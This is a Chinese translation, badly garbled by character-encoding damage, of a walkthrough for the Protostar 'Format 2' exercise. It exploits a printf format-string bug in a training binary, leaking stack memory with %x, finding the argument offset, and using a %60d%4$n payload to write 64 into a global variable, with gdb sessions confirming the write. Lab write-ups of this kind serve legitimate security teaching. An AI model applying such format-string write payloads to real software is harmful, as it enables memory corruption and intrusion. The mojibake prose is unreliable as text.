# [ExpDev]æ¼æ´åˆ©ç”¨ç»ƒä¹ |åŸæ’æ˜Ÿ|æ ¼å¼ 2

> åŸæ–‡ï¼š<https://infosecwriteups.com/expdev-exploit-exercise-protostar-format-2-73ef08011a8c?source=collection_archive---------1----------------------->

![](img/2efb532c4538935e46dd82617a38cc92.png)

# æ ¼å¼ 2(æ ¼å¼å­—ç¬¦ä¸²åŸºæœ¬ 2)

è¿™ä¸ªæŒ‘æˆ˜çš„ç›®æ ‡æ˜¯æ‰¾åˆ°æˆ‘ä»¬å¯ä»¥åœ¨å†…å­˜ä¸­å†™å…¥æ‰€æä¾›çš„è¾“å…¥çš„ä½ç½®ï¼Œå¹¶æ‰¾åˆ°æ­£ç¡®çš„åç§»å€¼æ¥æ‰“å°è·èƒœçš„è¯­å¥ã€‚

*   é“¾æ¥:[https://exploit-exercises.lains.space/protostar/format2/](https://exploit-exercises.lains.space/protostar/format2/)

![](img/a4b6ea2750c378d19c4f67bebcf28125.png)

## æ³¨æ„äº‹é¡¹

*   `**char buffer[512]**`:è®¾ç½®ç¼“å†²åŒºå¤§å°ä¸º 512ã€‚
*   `**fgets(buffer, sizeof(buffer), stdin)**`:è·å–ç”¨æˆ·æä¾›çš„è¾“å…¥ã€‚å¹¶ä¸”å®ƒå°†ç¼“å†²åŒºå¤§å°é™åˆ¶ä¸º 512ã€‚æˆ‘ä»¬æœ€å¤šå¯ä»¥è¾“å…¥ 511 ä¸ªå­—èŠ‚ï¼Œå› ä¸º C æ€»æ˜¯åœ¨æœ«å°¾æ·»åŠ `0x00`ä½œä¸ºç»ˆæ­¢ç¬¦ã€‚
*   `**printf(buffer);**`:è¿™æ˜¯è¿™æ®µä»£ç ä¸­æ˜“å—æ”»å‡»çš„å‡½æ•°ã€‚`printf()`å°†*è€Œä¸æ˜¯*æ£€æŸ¥æ‰€æä¾›çš„è¾“å…¥æ˜¯å¦æ˜¯é¢„æœŸçš„æ ¼å¼å­—ç¬¦ä¸²ï¼Œå› ä¸ºå®ƒè¢«ç¼–ç ä¸ºæ¥å—ä»»ä½•å­—ç¬¦ä¸²å€¼ã€‚å› æ­¤ï¼Œæˆ‘ä»¬æ‰€èƒ½åšçš„åªæ˜¯éªŒè¯æˆ‘ä»¬æ˜¯å¦å¯ä»¥æ³„æ¼å†…å­˜åœ°å€ï¼Œå¹¶ä¸”è¿˜å¯ä»¥å°†ä»»æ„ä»£ç å†™å…¥å †æ ˆ(**ã€è¯»å–ã€‘** `%p`æˆ–`%x` â†’ **ã€å†™å…¥ã€‘** `%n`)ã€‚
*   `**if(target == 64) {**`:å˜é‡`target`æ˜¯æˆ‘ä»¬éœ€è¦æŸ¥æ‰¾çš„åœ°å€ã€‚ç„¶åï¼Œé€šè¿‡åˆ©ç”¨æ ¼å¼å­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘ä»¬å°†å‘`target`å†™å…¥ä»»æ„å­—èŠ‚æ¥åŒ¹é… 64ï¼Œä»¥æ‰“å°å‡ºè·èƒœçš„è¯­å¥ã€‚

# æ‹†è§£(GDB)

è®©æˆ‘ä»¬åæ±‡ç¼–äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œçœ‹çœ‹åœ¨ ASM çº§åˆ«åšäº†ä»€ä¹ˆ:

```
**$ gdb -q format2**
Reading symbols from /opt/protostar/bin/format2...done.
**(gdb) set disassembly-flavor intel
(gdb) disassemble vuln**
```

![](img/1e065522e7005860581ed691eca53cde.png)

# å‰¥å‰Š

## åˆæ­¥ä¾¦å¯Ÿ

å½“æˆ‘ä»¬æä¾›ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šå›æ˜¾å‡ºæ¥ï¼Œå¹¶æ‰“å°å‡ºâ€œtarget is 0:(â€

```
**$ python -c 'print "AAAA"' | /opt/protostar/bin/format2**
AAAA
target is 0 :(
```

ä½†æ˜¯å¦‚æœæˆ‘ä»¬æä¾›ä¸€äº›æ ¼å¼å­—ç¬¦ä¸²å‚æ•°(`%x`)ï¼Œæˆ‘ä»¬ä¼šå¾—åˆ°ä¸€äº›æœ‰è¶£çš„è¾“å‡º:

```
**$ python -c 'print "AAAA" + "|%08x" * 2' | /opt/protostar/bin/format2**
AAAA|0000200|b7fd8420    **<-- Leaking memory address**
target is 0 :(***### Format String Explanation
"%08x"*** *= "%x" is a Format String parameter of the hexdecimal 
         representation. The number "08" is called "width field" and 
         is the minimum which will pad the output of the %x 
         specified to 8 characters = 4 bytes long.*
```

## å¯»æ‰¾åç§»

æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°åç§»å€¼ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å †æ ˆä¸Šçœ‹åˆ°æˆ‘ä»¬æä¾›çš„è¾“å…¥ã€‚å°è¯•å¢åŠ å‡ ä¸ª`%x`ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°åç§»é‡ä¸º 4ã€‚

```
**$ python -c 'print "AAAA" + "|%08x" * 4' | /opt/protostar/bin/format2**
AAAA|00000200|b7fd8420|bffff5d4|**41414141    <-- chr(0x41) = "A"**
target is 0 :(
```

## å¯»æ‰¾â€œç›®æ ‡â€å˜é‡åœ°å€

```
**$ objdump -t format2 |grep target**
**080496e4** g     O .bss **00000004**              target
```

`target`çš„åœ°å€å­˜åœ¨äº`0x080496e4`ä¸­ã€‚å°†å®ƒè½¬æ¢æˆ little-endian æ ¼å¼= `\xe4\x96\x04\x08`ã€‚

å°†ç”µæºè¾“å…¥æ›´æ”¹ä¸ºæ‰¾åˆ°çš„`target`åœ°å€ã€‚ä½†æ˜¯è¿™æ¬¡è®©æˆ‘ä»¬çœ‹çœ‹æ˜¯å¦å¯ä»¥ä½¿ç”¨`%n`åœ¨å†…å­˜ä¸­å†™ä¸€äº›ä¸œè¥¿(= *å†™å…¥ä½œä¸ºå‚æ•°*ç»™å‡ºçš„åœ°å€ä¸­çš„å­—ç¬¦æ•°)ã€‚

```
**$ python -c 'print "\xe4\x96\x04\x08" + "%4$n"' | /opt/protostar/bin/format2**
ï¿½
target is 4 :(    **<-- It wrote "4" at the "target" location*****### Format String Explanation
"%4$08n"*** *= Directly access the 4th parameter on stack with "4$" and 
           write the address* (\xe4\x96\x04\x08**)** *there with "%08n"*
```

## æœ€ç»ˆåˆ©ç”¨

å¤ªæ£’äº†ã€‚æˆ‘ä»¬çš„ä¸‹ä¸€ä¸ªä»»åŠ¡ç°åœ¨å¾ˆæ¸…æ¥šäº†ï¼Œæˆ‘ä»¬åªéœ€è¦è®¡ç®—å‡ºåœ¨å°†è¾“å‡ºå†™å…¥`target`æ—¶ï¼Œéœ€è¦å¤šå°‘é¢å¤–çš„å¡«å……æˆ–å®½åº¦å­—æ®µæ‰èƒ½ä½¿è¾“å‡ºè¾¾åˆ° 64 (= `0x40`åå…­è¿›åˆ¶)ã€‚è‚¯å®šæœ‰æ›´å¥½çš„æ–¹æ³•æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä½†æ˜¯ç®¡å®ƒå‘¢ï¼Œè¿™æ¬¡è®©æˆ‘ä»¬ç®€å•åœ°åšä¸€ä¸ªè¯•é”™æ³•ğŸ˜›ã€‚

å¥½çš„ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬æ·»åŠ æ›´å¤šçš„ç„Šç›˜æ—¶ï¼Œå®ƒä¼šå¢åŠ åœ¨`target`å†™å…¥çš„è¾“å‡ºã€‚æ‰€ä»¥å¢åŠ `%60d`å®½åº¦è§£å†³äº†è¿™ä¸ªæŒ‘æˆ˜ã€‚

```
$ python -c 'print "\xe4\x96\x04\x08" + **"%10d" + "%4$08n"**' | /opt/protostar/bin/format2
       512
target is 14 :($ python -c 'print "\xe4\x96\x04\x08" + **"%20d" + "%4$08n"**' | /opt/protostar/bin/format2
                 512
target is 24 :($ python -c 'print "\xe4\x96\x04\x08" + **"%60d" + "%4$08n"**' | /opt/protostar/bin/format2
                                                         512
**you have modified the target :)**
```

## æœ€ç»ˆåˆ©ç”¨# 2(*ä¼˜é›…çš„è§£å†³æ–¹æ¡ˆ)

å¥½å§ï¼Œç­‰ç­‰ã€‚è®©æˆ‘ç”¨ä¸€ç§ä¼˜é›…çš„æ–¹å¼è§£é‡Šä¸€ä¸‹ğŸ™‚ã€‚æˆ‘å°†å‘æ‚¨å±•ç¤ºå¦‚ä½•è®¡ç®—ç²¾ç¡®çš„å®½åº¦å­—æ®µï¼Œä»¥è·å¾—æˆ‘ä»¬æƒ³è¦çš„è¾“å‡ºã€‚

é¦–å…ˆï¼Œè®©æˆ‘ä»¬å°†åˆå§‹æœ‰æ•ˆè½½è·(æ²¡æœ‰å®½åº¦å¡«å……)æ”¾å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç”¨ gdb è¿è¡Œå®ƒã€‚

```
**[Initial Payload]**
$ python -c 'print "\xe4\x96\x04\x08" + "%4$n"' > format2_payload
```

ç”¨ gdb è¿è¡Œ`Format 2`ï¼Œå°†æ–­ç‚¹è®¾ç½®åœ¨`cmp eax, 0x40`ä½ç½®ã€‚

```
**$ gdb -q format2**
  Reading symbols from /opt/protostar/bin/format2...done.
**(gdb) set disassembly-flavor intel 
(gdb) disassemble vuln**
  Dump of assembler code for function vuln:
  ...(snip)...
  0x0804848a <vuln+54>: mov    eax,ds:0x80496e4
  **0x0804848f <vuln+59>: cmp    eax,0x40**
  ...(snip)...  
  End of assembler dump.
**(gdb) break * 0x0804848f    <-- Breakpoint**
```

ç°åœ¨ï¼Œè®©æˆ‘ä»¬ç”¨æœ‰æ•ˆè½½è·è¿è¡Œç¨‹åºã€‚

```
**(gdb) run < /home/user/format2/format2_payload**

**### Search for the "target"**
**(gdb) x/5x 0x80496e4**
  0x80496e4 <target>: **0x00000004** 0x00000000 0x00000000 0x00000000
  0x80496f4         : 0x00000000
```

ä½ å¯ä»¥çœ‹åˆ°â€œ4â€è¢«å†™å…¥äº†`target`ã€‚æœ‰ä¸€ç§æ–¹æ³•å¯ä»¥è®¡ç®—å‡ºæˆ‘ä»¬éœ€è¦å¡«å……å¤šå°‘å®½åº¦æ‰èƒ½å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„è¾“å‡ºã€‚

```
**### Width Calculation**
"Desired byte" - "Current byte" = "Width"
```

æˆ‘ä»¬åœ¨å¹¿å‘è¡Œåšè¿™ä¸ªå§ã€‚

```
**(gdb) print 0x40 - 0x04**
  $1 = 60**"0x40"** = Hex representation of decimal 64 of our desired value
**"0x04"** = The currently outputted value at the "target"
```

å¥½çš„ï¼Œå®ƒè®¡ç®—äº† 60 çš„å·®å¼‚ï¼Œè¿™æ˜¯æˆ‘ä»¬çš„å®½åº¦ã€‚è®©æˆ‘ä»¬æ›´æ–°æˆ‘ä»¬çš„æœ‰æ•ˆè½½è·ï¼Œå¹¶å†æ¬¡åé¦ˆç»™ gdb è¿›è¡Œç¡®è®¤ã€‚

```
**[Final Payload]**
$ python -c 'print "\xe4\x96\x04\x08" + "%60d" + "%4$n"' > format2_payload**[GDB]**
**(gdb) run < /home/user/format2/format2_payload**
  Starting program: /opt/protostar/bin/format2 < /home/user/format2 
  /format2_payload
                                                         512 Breakpoint 1, 0x0804848f in vuln () at format2/format2.c:15
  15 in format2/format2.c
**(gdb) x/5x 0x80496e4**
  0x80496e4 <target>: **0x00000040** 0x00000000 0x00000000 0x00000000
  0x80496f4\.        : 0x00000000
**--> The output is updated to 0x40 (= 64 in decimal)****(gdb) x/3i $eip    <-- Querying next 3 instruction pointers**
  0x804848f <vuln+59>: cmp    eax,0x40
  0x8048492 <vuln+62>: jne    0x80484a2 <vuln+78>
  0x8048494 <vuln+64>: mov    DWORD PTR [esp],0x8048590
**(gdb) continue**
  Continuing.
  **you have modified the target :)** Program exited with code 040.
```

æ„Ÿè°¢é˜…è¯»ï¼

## ä¸‹ä¸€ä¸ªæŒ‘æˆ˜:

*   [**æ ¼å¼ 3**](https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-format-3-33e8d8f1e83) :æ ¼å¼å­—ç¬¦ä¸²åˆ©ç”¨:åŸºæœ¬ 3

![](img/4386dc7dccb932a5644c84bedccdd603.png)